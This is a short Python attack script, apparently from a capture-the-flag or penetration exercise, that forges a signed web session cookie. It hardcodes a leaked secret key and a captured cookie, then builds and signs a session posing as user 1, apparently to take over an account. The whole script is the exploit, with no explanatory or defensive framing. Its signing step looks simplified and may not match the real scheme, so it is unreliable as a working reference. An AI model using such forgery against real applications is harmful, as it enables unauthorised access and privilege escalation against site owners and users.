import base64, json, hmac, hashlib, time

SECRET_KEY = 'G7x7pMBBduHU0HH5avEQ'
captured_cookie = 'eyJfZnJlc2giOmZhbHNlfQ.aVcAlQ._iR0jFMQlN7S10HnF9G9QGAnzec'

print('Original Cookie:', captured_cookie)

# Decode original session
payload_b64, timestamp_b64, signature = captured_cookie.split('.')
padding = 4 - len(payload_b64) % 4
if padding != 4:
    payload_b64 += '=' * padding
original_session = json.loads(base64.urlsafe_b64decode(payload_b64))
print('\nDecoded Original Session:')
print(json.dumps(original_session, indent=2))

# Create forged session
forged_session = {
    '_fresh': True,
    '_id': 'a' * 32,
    'user_id': 1,
    '_user_id': 1
}
print('\nForged Session Data:')
print(json.dumps(forged_session, indent=2))

# Encode forged session
session_json = json.dumps(forged_session, separators=(',', ':'))
forged_payload = base64.urlsafe_b64encode(session_json.encode()).rstrip(b'=').decode('ascii')
forged_timestamp = base64.urlsafe_b64encode(str(int(time.time())).encode()).rstrip(b'=').decode('ascii')
data_to_sign = f'{forged_payload}.{forged_timestamp}'
signer = hmac.new(SECRET_KEY.encode(), data_to_sign.encode(), hashlib.sha1)
forged_signature = base64.urlsafe_b64encode(signer.digest()).rstrip(b'=').decode('ascii')
forged_cookie = f'{forged_payload}.{forged_timestamp}.{forged_signature}'

print('\nForged Cookie:')
print(forged_cookie)
